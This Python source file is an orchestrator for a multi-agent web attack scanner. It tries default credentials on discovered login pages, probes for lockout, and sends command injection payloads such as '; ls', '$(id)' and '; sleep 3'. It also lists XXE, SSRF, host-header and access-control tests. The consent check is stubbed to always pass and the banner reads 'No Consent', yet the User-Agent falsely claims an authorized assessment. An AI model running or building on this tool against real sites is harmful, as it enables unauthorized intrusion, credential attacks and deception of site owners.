import json
import os
import time
import threading
import concurrent.futures
import requests
from datetime import datetime
from colorama import Fore, Style, init
from agents import (
    AuthAgent, CommandInjectionAgent,
    FileUploadAgent, SSRFAgent, XXEAgent,
    NoSQLAgent, SSTIAgent, CSRFAgent,
    WebSocketAgent, HTTPHostHeaderAgent,
    WebCacheAgent, OAuthAgent,
    PrototypePollutionAgent, AccessControlAgent
)
from core.report_generator import AdvancedReportGenerator

init(autoreset=True)


# ════════════════════════════════════════════════════
#  LIVE LOGGER
# ════════════════════════════════════════════════════
class LiveLogger:
    _lock = threading.Lock()

    def __init__(self, name, num, total, writer=None):
        self.name = name
        self.num = num
        self.total = total
        self.start = time.time()
        self.steps = 0
        self.writer = writer

    def _w(self, msg, level='INFO'):
        if self.writer:
            try:
                self.writer(msg, level)
            except:
                pass

    def _p(self, col, plain, level='INFO'):
        with LiveLogger._lock:
            print(col)
        self._w(plain, level)

    def header(self):
        self._p(
            f"\n{Fore.MAGENTA}{'═'*62}\n"
            f"  [{self.num:02d}/{self.total}]"
            f" {self.name}\n{'═'*62}"
            f"{Style.RESET_ALL}",
            f"[{self.num}/{self.total}] {self.name}",
            'AGENT'
        )

    def step(self, msg):
        self.steps += 1
        e = round(time.time() - self.start, 1)
        self._p(
            f"  {Fore.YELLOW}[►] {msg}"
            f" {Fore.WHITE}({e}s){Style.RESET_ALL}",
            f"[STEP {self.steps}] {msg} ({e}s)",
            'AGENT'
        )

    def info(self, msg):
        self._p(
            f"    {Fore.WHITE}│ {msg}{Style.RESET_ALL}",
            msg, 'INFO'
        )

    def ok(self, msg):
        self._p(
            f"    {Fore.GREEN}│ ✓ {msg}"
            f"{Style.RESET_ALL}",
            f"✓ {msg}", 'SUCCESS'
        )

    def warn(self, msg):
        self._p(
            f"    {Fore.YELLOW}│ ⚠ {msg}"
            f"{Style.RESET_ALL}",
            f"⚠ {msg}", 'WARN'
        )

    def finding(self, risk, title, detail=''):
        c = {
            'CRITICAL': Fore.RED,
            'HIGH': Fore.RED,
            'MEDIUM': Fore.YELLOW,
            'LOW': Fore.GREEN
        }.get(risk.upper(), Fore.WHITE)
        m = f"{title} | {detail}" if detail else title
        self._p(
            f"    {c}│ [{risk}] {m}{Style.RESET_ALL}",
            f"[{risk}] {m}", 'WARN'
        )

    def testing(self, what, val=''):
        self._p(
            f"    {Fore.CYAN}│ ▶ {what}"
            f" → {str(val)[:45]}{Style.RESET_ALL}",
            f"Testing {what} {val}", 'AGENT'
        )

    def done(self, count, dur=None):
        d = dur or round(time.time() - self.start, 1)
        col = Fore.RED if count > 0 else Fore.GREEN
        icon = '⚠' if count > 0 else '✓'
        self._p(
            f"\n  {col}{icon} {self.name}"
            f" DONE → {count} | {d}s"
            f"{Style.RESET_ALL}",
            f"{self.name} DONE → {count} | {d}s",
            'SUCCESS'
        )

    def error(self, msg):
        self._p(
            f"    {Fore.RED}│ ✗ {msg}"
            f"{Style.RESET_ALL}",
            f"ERROR: {msg}", 'ERROR'
        )

    def critical(self, msg):
        self._p(
            f"    {Fore.RED}│ ⚠⚠ CRITICAL: {msg}"
            f"{Style.RESET_ALL}",
            f"CRITICAL: {msg}", 'CRITICAL'
        )

    def skip(self, msg):
        self._p(
            f"    {Fore.WHITE}│ ○ Skip: {msg}"
            f"{Style.RESET_ALL}",
            f"Skip: {msg}", 'INFO'
        )

    def timeout(self, seconds):
        self._p(
            f"    {Fore.YELLOW}│ ⏱ TIMEOUT:"
            f" {seconds}s exceeded"
            f"{Style.RESET_ALL}",
            f"TIMEOUT: {seconds}s exceeded",
            'WARN'
        )


# ════════════════════════════════════════════════════
#  SESSION BUILDER - Fresh per agent
# ════════════════════════════════════════════════════
def _make_agent_session(base_session=None):
    """
    Create fresh session for each agent.
    Copies proxy settings from base session
    but avoids sharing state.
    """
    s = requests.Session()
    s.headers.update({
        'User-Agent': (
            'SecurityAudit/1.0 '
            '(Authorized Assessment)'
        )
    })
    s.timeout = 10

    # Copy proxy if base has Tor/proxy
    if base_session and hasattr(
        base_session, 'proxies'
    ):
        if base_session.proxies:
            s.proxies = base_session.proxies.copy()

    return s


# ════════════════════════════════════════════════════
#  AUTH AGENT
# ════════════════════════════════════════════════════
def run_auth_verbose(target_url, session, log):
    from urllib.parse import urljoin
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        log.error("BeautifulSoup not installed")
        return []

    findings = []

    log.step(
        "Phase 1: Login page discovery"
        " (8 paths parallel)"
    )
    login_paths = [
        '/login', '/signin', '/admin',
        '/wp-login.php', '/wp-admin',
        '/administrator', '/api/login',
        '/dashboard',
    ]
    found_pages = []
    plock = threading.Lock()

    def check_path(path):
        url = urljoin(target_url, path)
        try:
            r = session.get(
                url, timeout=5,
                allow_redirects=True
            )
            if r.status_code == 200:
                soup = BeautifulSoup(
                    r.text, 'html.parser'
                )
                has_pwd = any(
                    i.get('type') == 'password'
                    for f in soup.find_all('form')
                    for i in f.find_all('input')
                )
                if has_pwd:
                    with plock:
                        found_pages.append({
                            'url': url, 'path': path
                        })
                    log.ok(f"Login found: {path}")
        except:
            pass

    try:
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=8
        ) as ex:
            ex.map(check_path, login_paths)
    except:
        pass

    log.info(f"Found {len(found_pages)} login pages")

    if not found_pages:
        log.warn("No login pages")
        findings.append({
            'type': 'No Login Page Found',
            'category': 'authentication',
            'risk': 'INFO',
            'description': 'No standard login pages'
        })
        return findings

    # Phase 2: Default creds
    log.step("Phase 2: Default creds (6 pairs)")
    default_creds = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '123456'),
        ('admin', ''),
        ('root', 'root'),
        ('test', 'test'),
    ]
    success_kw = [
        'dashboard', 'logout', 'welcome',
        'profile', 'signed in', 'logged in'
    ]
    failure_kw = [
        'invalid', 'incorrect', 'wrong',
        'failed', 'error', 'denied'
    ]

    for page in found_pages[:1]:
        url = page['url']
        try:
            r = session.get(url, timeout=6)
            soup = BeautifulSoup(r.text, 'html.parser')
            form = soup.find('form')
            if not form:
                continue
            user_field = pass_field = None
            for inp in form.find_all('input'):
                t = inp.get('type', '').lower()
                n = inp.get('name', '').lower()
                if t in ['text', 'email'] or any(
                    k in n for k in [
                        'user', 'email', 'login'
                    ]
                ):
                    user_field = inp.get('name')
                elif t == 'password':
                    pass_field = inp.get('name')
            if not user_field or not pass_field:
                continue
            log.info(
                f"Fields → user:'{user_field}'"
                f" pass:'{pass_field}'"
            )
            action = form.get('action', url)
            if not action.startswith('http'):
                action = urljoin(url, action)
            for uname, pwd in default_creds:
                log.testing("Creds", f"{uname}:{pwd}")
                try:
                    resp = session.post(
                        action,
                        data={
                            user_field: uname,
                            pass_field: pwd
                        },
                        timeout=8,
                        allow_redirects=True
                    )
                    rl = resp.text.lower()
                    if (
                        any(s in rl for s in success_kw)
                        and not any(
                            f in rl for f in failure_kw
                        )
                    ):
                        log.critical(
                            f"Creds work: {uname}:{pwd}"
                        )
                        findings.append({
                            'type': 'Default Credentials',
                            'category': 'authentication',
                            'risk': 'CRITICAL',
                            'url': action,
                            'username': uname,
                            'password': pwd,
                            'description': (
                                f'"{uname}:{pwd}" accepted'
                            ),
                            'business_impact': (
                                'Full account takeover'
                            ),
                            'fix': 'Change defaults + MFA',
                            'cvss_score': 9.8,
                            'cwe': 'CWE-798'
                        })
                    time.sleep(0.15)
                except:
                    pass
        except:
            pass

    # Phase 3: Lockout
    log.step("Phase 3: Lockout test (5 attempts)")
    for page in found_pages[:1]:
        url = page['url']
        try:
            r = session.get(url, timeout=6)
            soup = BeautifulSoup(r.text, 'html.parser')
            form = soup.find('form')
            if not form:
                continue
            user_field = pass_field = None
            for inp in form.find_all('input'):
                t = inp.get('type', '').lower()
                n = inp.get('name', '').lower()
                if t in ['text', 'email'] or any(
                    k in n for k in [
                        'user', 'email', 'login'
                    ]
                ):
                    user_field = inp.get('name')
                elif t == 'password':
                    pass_field = inp.get('name')
            if not user_field or not pass_field:
                continue
            action = form.get('action', url)
            if not action.startswith('http'):
                action = urljoin(url, action)
            lockout = False
            for i in range(5):
                log.testing(
                    f"Attempt {i+1}/5", f"wrong_{i}"
                )
                try:
                    resp = session.post(
                        action,
                        data={
                            user_field: 'locktest',
                            pass_field: f'wrong_{i}'
                        },
                        timeout=6
                    )
                    rl = resp.text.lower()
                    if any(
                        k in rl for k in [
                            'locked', 'too many',
                            'blocked', 'limit'
                        ]
                    ) or resp.status_code == 429:
                        lockout = True
                        log.ok(
                            f"Lockout at {i+1}"
                        )
                        break
                except:
                    pass
                time.sleep(0.1)
            if not lockout:
                log.warn("No lockout!")
                findings.append({
                    'type': 'Missing Lockout',
                    'category': 'authentication',
                    'risk': 'HIGH',
                    'url': url,
                    'description': (
                        'No lockout after 5 attempts'
                    ),
                    'business_impact': 'Brute force',
                    'fix': 'Lock after 5 fails',
                    'cvss_score': 7.5,
                    'cwe': 'CWE-307'
                })
        except:
            pass

    # Phase 4: MFA
    log.step("Phase 4: MFA detection")
    if found_pages:
        try:
            r = session.get(
                found_pages[0]['url'], timeout=6
            )
            rl = r.text.lower()
            if any(
                k in rl for k in [
                    'two-factor', '2fa', 'totp',
                    'authenticator', 'otp'
                ]
            ):
                log.ok("MFA detected")
            else:
                log.info("No MFA")
                findings.append({
                    'type': 'No MFA Detected',
                    'category': 'authentication',
                    'risk': 'MEDIUM',
                    'url': found_pages[0]['url'],
                    'description': 'No MFA',
                    'business_impact': 'Password=access',
                    'fix': 'TOTP',
                    'cvss_score': 6.5,
                    'cwe': 'CWE-308'
                })
        except:
            pass

    return findings


# ════════════════════════════════════════════════════
#  COMMAND INJECTION AGENT
# ════════════════════════════════════════════════════
def run_command_injection_verbose(
    target_url, session, log
):
    from urllib.parse import quote, urlparse
    findings = []
    payloads = [
        '; ls', '| ls', '& ls',
        '; whoami', '| whoami',
        '$(id)', '`id`'
    ]
    os_indicators = [
        'uid=', 'gid=', 'root:',
        '/usr/bin', 'drwxr'
    ]

    log.step(
        f"Phase 1: Error-based"
        f" ({len(payloads)} payloads)"
    )
    parsed = urlparse(target_url)
    if not parsed.query:
        test_urls = [
            f"{target_url}?ping=127.0.0.1",
            f"{target_url}?host=localhost",
            f"{target_url}?cmd=ls",
        ]
        log.info(f"Probe URLs: {len(test_urls)}")
    else:
        test_urls = [target_url]
        params_dict = dict(
            p.split('=', 1)
            for p in parsed.query.split('&')
            if '=' in p
        )
        log.info(f"URL params: {list(params_dict.keys())}")

    for url in test_urls[:2]:
        p2 = urlparse(url)
        params = dict(
            p.split('=', 1)
            for p in p2.query.split('&')
            if '=' in p
        )
        for param in list(params.keys())[:2]:
            log.info(f"Testing param: '{param}'")
            for payload in payloads[:6]:
                log.testing(f"'{param}'", payload)
                tp = params.copy()
                tp[param] = params[param] + payload
                q = '&'.join(
                    f'{k}={quote(str(v), safe="")}'
                    for k, v in tp.items()
                )
                turl = (
                    f"{p2.scheme}://{p2.netloc}"
                    f"{p2.path}?{q}"
                )
                try:
                    r = session.get(turl, timeout=8)
                    hit = next(
                        (
                            ind for ind in os_indicators
                            if ind in r.text
                        ),
                        None
                    )
                    if hit:
                        log.critical(
                            f"OS output! '{hit}'"
                            f" in '{param}'"
                        )
                        findings.append({
                            'type': 'Command Injection',
                            'category': (
                                'command_injection'
                            ),
                            'risk': 'CRITICAL',
                            'url': turl,
                            'parameter': param,
                            'payload': payload,
                            'evidence': hit,
                            'description': (
                                f'OS output in "{param}"'
                            ),
                            'business_impact': 'RCE',
                            'fix': 'No OS calls',
                            'cvss_score': 10.0,
                            'cwe': 'CWE-78'
                        })
                    time.sleep(0.1)
                except Exception as e:
                    log.error(str(e))

    log.step("Phase 2: Time-based blind")
    time_payloads = ['; sleep 3', '| sleep 3']
    if parsed.query:
        params = dict(
            p.split('=', 1)
            for p in parsed.query.split('&')
            if '=' in p
        )
        for param in list(params.keys())[:1]:
            try:
                start = time.time()
                session.get(target_url, timeout=10)
                baseline = time.time() - start
                log.info(
                    f"Baseline: {round(baseline, 2)}s"
                )
            except:
                continue
            for payload in time_payloads:
                log.testing("Time payload", payload)
                tp = params.copy()
                tp[param] = params[param] + payload
                q = '&'.join(
                    f'{k}={quote(str(v), safe="")}'
                    for k, v in tp.items()
                )
                turl = (
                    f"{parsed.scheme}://"
                    f"{parsed.netloc}"
                    f"{parsed.path}?{q}"
                )
                try:
                    s = time.time()
                    session.get(turl, timeout=12)
                    elapsed = time.time() - s
                    log.info(
                        f"Time: {round(elapsed, 2)}s"
                    )
                    if elapsed > baseline + 2.5:
                        delay = round(
                            elapsed - baseline, 1
                        )
                        log.critical(
                            f"Delay +{delay}s!"
                        )
                        findings.append({
                            'type': (
                                'Blind Command Injection'
                            ),
                            'category': (
                                'command_injection'
                            ),
                            'risk': 'CRITICAL',
                            'url': turl,
                            'parameter': param,
                            'payload': payload,
                            'description': (
                                f'Blind CMDi +{delay}s'
                            ),
                            'business_impact': (
                                'Blind RCE'
                            ),
                            'fix': 'No OS calls',
                            'cvss_score': 10.0,
                            'cwe': 'CWE-78'
                        })
                except Exception as e:
                    log.error(str(e))
    else:
        log.skip("No params for time-based")

    return findings


# ════════════════════════════════════════════════════
#  GENERIC AGENT WRAPPER - WITH TIMEOUT FIX
# ════════════════════════════════════════════════════
def run_agent_verbose(
    agent_class, target_url, session, log,
    extra_info=None,
    timeout_sec=60   # ✅ Per-agent timeout
):
    """
    Runs any agent with hard timeout.
    Prevents single agent from blocking all.
    """
    if extra_info:
        for line in extra_info:
            log.info(line)

    # ── Result holders ────────────────────────────
    result_holder = [None]
    error_holder = [None]
    done_event = threading.Event()

    def _run():
        try:
            agent = agent_class(target_url, session)
            result_holder[0] = agent.run_full_scan()
        except Exception as e:
            error_holder[0] = e
        finally:
            done_event.set()

    # ── Run in thread with timeout ────────────────
    log.step(f"Running scan (max {timeout_sec}s)...")
    t = threading.Thread(target=_run, daemon=True)
    t.start()

    finished = done_event.wait(timeout=timeout_sec)

    if not finished:
        # ✅ Timeout - don't wait, return empty
        log.timeout(timeout_sec)
        return []

    if error_holder[0]:
        log.error(str(error_holder[0]))
        return []

    findings = result_holder[0] or []

    if findings:
        log.step(f"Findings: {len(findings)}")
        for f in findings:
            risk = f.get('risk', 'INFO')
            ftype = f.get('type', 'Unknown')
            desc = str(
                f.get('description', '')
            )[:60]
            log.finding(risk, ftype, desc)
            fix = f.get('fix', '')
            if fix:
                log.info(f"  Fix: {str(fix)[:80]}")
    else:
        log.ok("No vulnerabilities detected")

    return findings


# ════════════════════════════════════════════════════
#  ORCHESTRATOR
# ════════════════════════════════════════════════════
class AdvancedScanOrchestrator:
    def __init__(self, target_url, groq_key):
        self.target = (
            target_url
            .replace('https://', '')
            .replace('http://', '')
            .strip('/')
        )
        self.target_url = f"https://{self.target}"
        self.groq_key = groq_key
        self.results = {}
        self.start_time = None
        self.end_time = None
        self._write_log = None
        self.shared_session = None
        self.session = None

        # ── Per-agent timeouts ────────────────────
        self.TIMEOUTS = {
            'authentication':      45,
            'command_injection':   40,
            'file_upload':         35,
            'ssrf':                35,
            'xxe':                 30,
            'nosql_injection':     30,
            'ssti':                30,
            'csrf':                25,
            'websocket':           25,
            'http_host_header':    25,
            'web_cache':           25,
            'oauth':               30,
            'prototype_pollution': 30,
            'access_control':      35,
        }

    def print_banner(self):
        print(f"\n{Fore.MAGENTA}" + "═" * 62)
        print("  AI ADVANCED SECURITY ASSESSMENT")
        print(
            "  Category 3 — Smart Parallel"
            " Scan (No Consent)"
        )
        print("═" * 62)
        print(f"  Target  : {self.target[:42]}")
        print(
            f"  Date    : "
            f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        print("  Mode    : ADVANCED PARALLEL DIRECT")
        print("  Agents  : 14 (Smart Grouping)")
        print("═" * 62 + Style.RESET_ALL)

    def _get_consent(self):
        return True

    def _print_scan_plan(self):
        print(f"\n{Fore.CYAN}" + "═" * 62)
        print("  SCAN PLAN — 14 AGENTS")
        print("═" * 62)
        plan = [
            (1, "Authentication",
             "Default creds|Lockout|MFA",
             "Sequential"),
            (2, "Command Injection",
             "Error|Time-blind",
             "Sequential"),
            (3, "File Upload",
             "Ext bypass|MIME bypass",
             "Parallel"),
            (4, "SSRF",
             "Internal|AWS metadata",
             "Parallel"),
            (5, "XXE",
             "File read|SSRF via XML",
             "Parallel"),
            (6, "NoSQL Injection",
             "JSON ops|Param inject",
             "Parallel"),
            (7, "SSTI",
             "Jinja2|Twig|ERB",
             "Parallel"),
            (8, "CSRF",
             "Token|SameSite",
             "Parallel"),
            (9, "WebSocket",
             "Discovery|Encryption",
             "Parallel"),
            (10, "HTTP Host Header",
             "Injection|Poisoning",
             "Parallel"),
            (11, "Web Cache",
             "Headers|Deception",
             "Parallel"),
            (12, "OAuth",
             "State|Redirect URI",
             "Parallel"),
            (13, "Prototype Pollution",
             "Client|Server",
             "Parallel"),
            (14, "Access Control",
             "Admin|Method bypass",
             "Parallel"),
        ]
        for num, name, cov, mode in plan:
            mc = (
                Fore.YELLOW
                if mode == "Sequential"
                else Fore.GREEN
            )
            print(
                f"  {Fore.MAGENTA}[{num:02d}]"
                f"{Fore.WHITE} {name:<22}"
                f"{Fore.CYAN}{cov:<28}"
                f"{mc}{mode}"
                + Style.RESET_ALL
            )
        print("═" * 62 + Style.RESET_ALL)

    def _make_session(self):
        """Create fresh direct session."""
        s = requests.Session()
        s.headers.update({
            'User-Agent': (
                'SecurityAudit/1.0'
                ' (Authorized Assessment)'
            )
        })
        return s

    def _get_base_session(self):
        """
        Get base session for copying proxy settings.
        """
        return (
            self.shared_session
            or self.session
            or None
        )

    def _agent_session(self):
        """
        Create fresh session per agent.
        Copies proxy from shared if available.
        """
        return _make_agent_session(
            self._get_base_session()
        )

    def run_assessment(self, skip_consent=True):
        self.print_banner()
        self._print_scan_plan()
        self.start_time = datetime.now()

        def _log(msg, level='INFO'):
            if self._write_log:
                try:
                    self._write_log(msg, level)
                except:
                    pass

        _log(
            'Cat3: Group1 sequential'
            ' (Auth + CmdInject)',
            'AGENT'
        )

        # ════════════════════════════════════════
        #  GROUP 1: Sequential
        # ════════════════════════════════════════
        print(
            f"\n{Fore.CYAN}{'─'*62}"
            f"\n  GROUP 1: Sequential"
            f" (Auth + CmdInject)"
            f"\n{'─'*62}"
            + Style.RESET_ALL
        )

        # ── Agent 1: Authentication ───────────────
        log1 = LiveLogger(
            "AUTHENTICATION", 1, 14,
            writer=self._write_log
        )
        log1.header()
        _log(
            'Cat3: [Authentication] starting',
            'AGENT'
        )
        s1 = time.time()
        try:
            # ✅ Fresh session per agent
            sess1 = self._agent_session()
            self.results['authentication'] = (
                run_auth_verbose(
                    self.target_url, sess1, log1
                )
            )
        except Exception as e:
            log1.error(str(e))
            self.results['authentication'] = []
            _log(
                f'Cat3 [auth] error: {e}', 'ERROR'
            )
        d1 = round(time.time() - s1, 1)
        c1 = len(self.results['authentication'])
        log1.done(c1, d1)
        _log(
            f'Cat3 [authentication]:'
            f' {c1} findings | {d1}s',
            'WARN' if c1 > 0 else 'SUCCESS'
        )

        # ── Agent 2: Command Injection ────────────
        log2 = LiveLogger(
            "COMMAND INJECTION", 2, 14,
            writer=self._write_log
        )
        log2.header()
        _log(
            'Cat3: [Command Injection] starting',
            'AGENT'
        )
        s2 = time.time()
        try:
            sess2 = self._agent_session()
            self.results['command_injection'] = (
                run_command_injection_verbose(
                    self.target_url, sess2, log2
                )
            )
        except Exception as e:
            log2.error(str(e))
            self.results['command_injection'] = []
            _log(
                f'Cat3 [cmd_inject] error: {e}',
                'ERROR'
            )
        d2 = round(time.time() - s2, 1)
        c2 = len(self.results['command_injection'])
        log2.done(c2, d2)
        _log(
            f'Cat3 [command_injection]:'
            f' {c2} findings | {d2}s',
            'WARN' if c2 > 0 else 'SUCCESS'
        )

        # ════════════════════════════════════════
        #  GROUP 2: 12 Parallel Agents
        # ════════════════════════════════════════
        print(
            f"\n{Fore.CYAN}{'─'*62}"
            f"\n  GROUP 2: 12 Agents in Parallel"
            f"\n{'─'*62}"
            + Style.RESET_ALL
        )
        _log(
            'Cat3: Group2 - 12 parallel agents',
            'AGENT'
        )

        parallel_agents = [
            (
                'file_upload', FileUploadAgent,
                'FILE UPLOAD', 3,
                [
                    "Scenario: Attacker uploads"
                    " malicious file",
                    "Tests: .php .asp .jsp | MIME",
                    "Paths: /upload /file /attach",
                ]
            ),
            (
                'ssrf', SSRFAgent,
                'SSRF', 4,
                [
                    "Scenario: Server fetches"
                    " internal resources",
                    "Tests: 127.0.0.1 | 169.254.x",
                    "Params: url uri link src dest",
                ]
            ),
            (
                'xxe', XXEAgent,
                'XXE INJECTION', 5,
                [
                    "Scenario: XML parser reads files",
                    "Tests: file:///etc/passwd",
                    "Endpoints: XML/SOAP APIs",
                ]
            ),
            (
                'nosql_injection', NoSQLAgent,
                'NOSQL INJECTION', 6,
                [
                    "Scenario: MongoDB bypass",
                    "Tests: {$gt:''} {$ne:null}",
                    "Methods: JSON + URL params",
                ]
            ),
            (
                'ssti', SSTIAgent,
                'SSTI', 7,
                [
                    "Scenario: Template injection",
                    "Tests: {{7*7}} ${7*7}",
                    "Engines: Jinja2 Twig ERB",
                ]
            ),
            (
                'csrf', CSRFAgent,
                'CSRF', 8,
                [
                    "Scenario: Forged requests",
                    "Tests: csrf_token | SameSite",
                    "Pages: login register settings",
                ]
            ),
            (
                'websocket', WebSocketAgent,
                'WEBSOCKET', 9,
                [
                    "Scenario: Unencrypted WS",
                    "Tests: wss:// vs ws://",
                    "Paths: /ws /websocket",
                ]
            ),
            (
                'http_host_header',
                HTTPHostHeaderAgent,
                'HTTP HOST HEADER', 10,
                [
                    "Scenario: Host header inject",
                    "Tests: evil-attacker.com",
                    "Checks: Reflection | Poison",
                ]
            ),
            (
                'web_cache', WebCacheAgent,
                'WEB CACHE', 11,
                [
                    "Scenario: Cache poisoning",
                    "Tests: Cache-Control | Vary",
                    "Deception: /profile.css tricks",
                ]
            ),
            (
                'oauth', OAuthAgent,
                'OAUTH', 12,
                [
                    "Scenario: OAuth flow issues",
                    "Tests: state | redirect_uri",
                    "Paths: /oauth /authorize",
                ]
            ),
            (
                'prototype_pollution',
                PrototypePollutionAgent,
                'PROTOTYPE POLLUTION', 13,
                [
                    "Scenario: __proto__ pollution",
                    "Tests: Client JS | Server JSON",
                    "Patterns: __proto__",
                ]
            ),
            (
                'access_control', AccessControlAgent,
                'ACCESS CONTROL', 14,
                [
                    "Scenario: Unauthorized access",
                    "Tests: /admin /superadmin",
                    "Bypass: Method | X-Original-URL",
                ]
            ),
        ]

        completed = [0]
        p_lock = threading.Lock()

        def run_parallel(agent_info):
            (
                key, agent_class,
                label, num, info
            ) = agent_info

            log = LiveLogger(
                label, num, 14,
                writer=self._write_log
            )
            log.header()
            for line in info:
                log.info(line)

            # ✅ FIX: Fresh session per parallel agent
            agent_sess = self._agent_session()

            _log(
                f'Cat3: [{label}] starting', 'AGENT'
            )
            s = time.time()

            timeout = self.TIMEOUTS.get(key, 30)

            try:
                findings = run_agent_verbose(
                    agent_class,
                    self.target_url,
                    agent_sess,
                    log,
                    timeout_sec=timeout
                )
                dur = round(time.time() - s, 1)
                log.done(len(findings), dur)
                count = len(findings)
                _log(
                    f'Cat3 [{key}]:'
                    f' {count} findings | {dur}s',
                    'WARN' if count > 0 else 'SUCCESS'
                )
                with p_lock:
                    completed[0] += 1
                    _log(
                        f'Cat3 progress:'
                        f' {completed[0]}/12 done',
                        'AGENT'
                    )
                return key, findings

            except Exception as e:
                dur = round(time.time() - s, 1)
                log.error(f"Crashed: {e}")
                _log(
                    f'Cat3 [{key}] error: {e}',
                    'ERROR'
                )
                return key, []

        # ── Launch parallel workers ───────────────
        max_w = min(12, len(parallel_agents))
        print(
            f"\n{Fore.MAGENTA}  [*] Launching"
            f" {len(parallel_agents)} agents"
            f" ({max_w} workers)..."
            + Style.RESET_ALL
        )

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=max_w
        ) as executor:
            futures = {
                executor.submit(
                    run_parallel, info
                ): info[0]
                for info in parallel_agents
            }

            for fut in (
                concurrent.futures.as_completed(
                    futures
                )
            ):
                key = futures[fut]
                try:
                    # ✅ FIX: Outer timeout = max
                    # agent timeout + buffer
                    rkey, findings = fut.result(
                        timeout=90
                    )
                    self.results[rkey] = findings
                    count = len(findings)
                    col = (
                        Fore.RED
                        if count > 0
                        else Fore.GREEN
                    )
                    print(
                        f"  {col}[✓] {rkey}:"
                        f" {count} findings"
                        + Style.RESET_ALL
                    )

                except (
                    concurrent.futures.TimeoutError
                ):
                    # ✅ FIX: Timeout - skip, continue
                    self.results[key] = []
                    print(
                        f"  {Fore.YELLOW}[!] {key}:"
                        f" TIMEOUT - skipped"
                        + Style.RESET_ALL
                    )
                    _log(
                        f'Cat3 [{key}] TIMEOUT',
                        'WARN'
                    )

                except Exception as e:
                    self.results[key] = []
                    print(
                        f"  {Fore.RED}[!] {key}:"
                        f" Error - {e}"
                        + Style.RESET_ALL
                    )
                    _log(
                        f'Cat3 [{key}] failed: {e}',
                        'ERROR'
                    )

        # ── Final Stats ──────────────────────────
        self.end_time = datetime.now()
        duration = (
            self.end_time - self.start_time
        ).seconds

        total_f = sum(
            len(v)
            for v in self.results.values()
            if isinstance(v, list)
        )
        critical = sum(
            1
            for v in self.results.values()
            if isinstance(v, list)
            for f in v
            if f.get('risk') == 'CRITICAL'
        )
        high = sum(
            1
            for v in self.results.values()
            if isinstance(v, list)
            for f in v
            if f.get('risk') == 'HIGH'
        )
        medium = sum(
            1
            for v in self.results.values()
            if isinstance(v, list)
            for f in v
            if f.get('risk') == 'MEDIUM'
        )

        _log(
            f'Cat3 COMPLETE:'
            f' {total_f} findings in {duration}s',
            'SUCCESS'
        )

        # Per-agent result summary
        print(
            f"\n{Fore.CYAN}  Agent Results:"
            + Style.RESET_ALL
        )
        all_keys = [
            'authentication', 'command_injection',
            'file_upload', 'ssrf', 'xxe',
            'nosql_injection', 'ssti', 'csrf',
            'websocket', 'http_host_header',
            'web_cache', 'oauth',
            'prototype_pollution', 'access_control',
        ]
        for k in all_keys:
            val = self.results.get(k, [])
            count = (
                len(val)
                if isinstance(val, list) else 0
            )
            col = (
                Fore.RED if count > 0
                else Fore.GREEN
            )
            icon = '⚠' if count > 0 else '✓'
            print(
                f"  {col}{icon} {k}:"
                f" {count} finding(s)"
                + Style.RESET_ALL
            )

        print(f"\n{Fore.GREEN}" + "═" * 62)
        print(
            f"  CATEGORY 3 COMPLETE"
            f" - {duration}s"
            f" - Total:{total_f}"
            f" C:{critical} H:{high} M:{medium}"
        )
        print("═" * 62 + Style.RESET_ALL)

        return self.results

    def generate_report(self):
        if not self.results:
            print(
                f"{Fore.RED}[!] No results."
                + Style.RESET_ALL
            )
            return None

        print(
            f"\n{Fore.CYAN}[*] Generating"
            f" AI report..."
            + Style.RESET_ALL
        )

        duration = (
            (self.end_time - self.start_time).seconds
            if self.start_time and self.end_time
            else 0
        )

        generator = AdvancedReportGenerator(
            self.groq_key
        )
        report = generator.generate_full_report(
            target=self.target,
            scan_results=self.results,
            scan_duration=duration
        )

        os.makedirs('output', exist_ok=True)
        timestamp = datetime.now().strftime(
            '%Y%m%d_%H%M%S'
        )
        base = os.path.join(
            'output',
            f"{self.target.replace('.', '_')}"
            f"_{timestamp}"
        )

        with open(
            f"{base}.md", 'w', encoding='utf-8'
        ) as f:
            f.write(report['markdown'])

        with open(
            f"{base}_raw.json", 'w', encoding='utf-8'
        ) as f:
            json.dump(
                self.results, f,
                indent=2, default=str
            )

        try:
            generator.generate_pdf(
                report['markdown'], f"{base}.pdf"
            )
        except Exception as e:
            print(
                f"  {Fore.YELLOW}[!] PDF: {e}"
                + Style.RESET_ALL
            )

        return report
